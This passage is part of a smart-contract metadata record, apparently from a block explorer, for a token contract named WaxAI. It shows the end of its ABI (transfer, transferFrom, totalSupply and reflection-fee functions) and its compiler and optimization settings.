pe\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rAmount\",\"type\":\"uint256\"}],\"name\":\"tokenFromReflection\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "WaxAI", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://29f9e9311487c44f8c4afbfdf237a3c1271429db8958628d9fe6ed8f9b885306"}